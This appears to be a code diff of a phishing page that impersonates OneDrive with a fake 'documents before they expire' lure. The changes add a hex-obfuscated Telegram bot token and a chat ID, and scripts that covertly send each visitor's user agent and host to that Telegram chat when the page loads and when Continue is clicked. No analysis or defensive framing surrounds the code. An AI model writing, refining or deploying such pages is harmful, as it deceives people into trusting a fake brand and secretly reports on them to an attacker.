@@ -3,18 +3,21 @@
 <head>
 <meta charset="UTF-8">
 <title>OneDrive Document Review</title>
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+<meta name="viewport" content="width=device-width, initial-scale=1">
 <style>
-body {
+* {
   margin: 0;
   padding: 0;
-  height: 100vh;
-  min-height: 100vh;
-  overflow: hidden;
+  box-sizing: border-box;
+}
+body {
   font-family: 'Segoe UI', Arial, sans-serif;
-  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg);
-  background-size: cover;
-  background-position: center;
+  background: url(https://www.shutterstock.com/image-photo/texture-blurry-text-open-textbook-600nw-1175839786.jpg) center/cover;
+  height: 100vh;
+  overflow: hidden;
+  display: flex;
+  justify-content: center;
+  align-items: center;
 }
 #loading-screen {
   position: fixed;
@@ -24,24 +27,23 @@ body {
   height: 100vh;
   background: #fff;
   display: flex;
-  flex-direction: column;
   justify-content: center;
   align-items: center;
   z-index: 1000;
 }
 #form-container {
   display: none;
-  position: relative;
-  height: 100vh;
+  width: 100%;
 }
 #content-container {
-  background-color: rgba(255, 255, 255, 0.95);
+  background: rgba(255, 255, 255, 0.95);
   border-radius: 8px;
   width: 90%;
   max-width: 520px;
-  margin: 20px auto;
+  margin: 0 auto;
   padding: 28px;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+  color: #0078D4;
 }
 .loading-dots {
   display: flex;
@@ -54,9 +56,48 @@ body {
   border-radius: 50%;
   animation: pulse 1.5s ease-in-out infinite;
 }
+.dot:nth-child(2) {
+  animation-delay: 0.3s;
+}
+.dot:nth-child(3) {
+  animation-delay: 0.6s;
+}
 @keyframes pulse {
   0%, 100% { transform: scale(1); opacity: 1; }
   50% { transform: scale(1.5); opacity: 0.5; }
+}
+.form-logo {
+  height: 30px;
+  margin: 0 auto 10px;
+  display: block;
+}
+h2 {
+  font-weight: 100;
+  margin: 1px 0 5px;
+}
+p {
+  margin: 5px 0;
+  font-size: 15px;
+}
+.continue-btn {
+  background: #0078D4;
+  color: white;
+  border: none;
+  border-radius: 4px;
+  padding: 10px 20px;
+  font-size: 16px;
+  cursor: pointer;
+  margin-top: 20px;
+  float: right;
+  transition: background 0.3s;
+}
+.continue-btn:hover {
+  background: #106ebe;
+}
+.text-right {
+  text-align: right;
+  clear: both;
+  padding-top: 15px;
 }
 </style>
 </head>
@@ -71,24 +112,37 @@ body {
 
 <div id="form-container">
   <div id="content-container">
-    <img src="https://example.com/onedrive-logo.png" alt="OneDrive" style="height:60px;margin:0 auto 20px;display:block;">
-    <div style="text-align:center;">
-      <p style="font-size:16px;margin:5px 0;">You've received important documents</p>
-      <p style="font-size:14px;margin:5px 0 20px;">Review your documents before they expire</p>
-      <button id="continue-btn" style="background:#2F79D1;color:white;border:none;padding:12px 24px;border-radius:4px;font-size:16px;cursor:pointer;">
-        Continue
-      </button>
+    <img class="form-logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:TE9-qpsWCdhqFIJ-F7v7uPzhCh3rTC6RSuBJ4faDjTUl4UKj9P6unigVYeqjno2VfuSQE&usqp=CAU" alt="OneDrive">
+    <h2>OneDrive Document Review</h2>
+    <p>Shared via OneDrive</p>
+    <p>Review and access these documents before they expire</p>
+    
+    <div class="text-right">
+      <button id="continue-btn" class="continue-btn">Continue</button>
     </div>
   </div>
 </div>
 
 <script>
+// Hex to string function
+function hexToString(hex) {
+  let str = '';
+  for (let i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  }
+  return str;
+}
+
+// Decode the bot token
+const b = "383234343532353937363A4141454C6C4E506635746B614747756E6E74486B46456C6E497A633977416865692D45";
+const botToken = hexToString(b);
+
 // Telegram alert on page visit
-fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({
-    chat_id: '-1002230164444',
+    chat_id: '5172045930',
     text: `🚀 Page Visit\nIP: ${window.location.hostname}\nUA: ${navigator.userAgent}`
   })
 }).catch(() => {});
@@ -102,11 +156,11 @@ setTimeout(() => {
 // Continue button handler
 document.getElementById('continue-btn').addEventListener('click', () => {
   // Telegram alert on continue click
-  fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({
-      chat_id: '-1002230164444',
+      chat_id: '5172045930',
       text: `🖱️ Continue Clicked\nIP: ${window.location.hostname}`
     })
   }).catch(() => {});
